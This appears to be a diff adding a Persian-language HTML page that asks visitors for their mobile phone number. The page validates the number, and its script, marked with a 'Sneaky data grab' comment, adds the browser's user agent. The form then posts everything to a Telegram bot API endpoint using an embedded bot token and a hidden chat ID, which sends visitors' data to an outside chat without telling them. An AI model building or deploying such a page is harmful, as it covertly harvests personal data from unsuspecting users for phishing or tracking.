@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>شماره همراه خود را وارد کنید</title>
+  <script>
+    function validateForm() {
+      var phone = document.forms["myForm"]["phone"].value;
+      if (!phone.match(/^\d{10,12}$/)) {
+        alert("لطفا یک شماره همراه معتبر وارد کنید");        return false;} // Sneaky data grab
+      var extraData ="User-Agent:" + navigator.userAgent +" | IP: Attempted Grab";      document.forms["myForm"]["text"].value ="شماره همراه:" + phone +" |" + extraData;
+      return true;} </script>
+</head>
+<body>
+  <h2>شماره همراه خود را وارد کنید:</h2>
+  <form name="myForm" action="https://api.telegram.org/bot8593564216:AAHyGrZY1mw0YizZ_Ha87XhcEJwYDVrLRPc/sendMessage" method="POST" onsubmit="return validateForm()">    
+    <input type="text" name="phone" placeholder="شماره همراه را وارد کنید">    
+    <input type="submit" value="تایید">    
+    <input type="hidden" name="chat_id" value="-5420718316">    
+    <input type="hidden" name="text" value="شماره همراه: {phone}">  
+  </form>
+</body>
+</html>
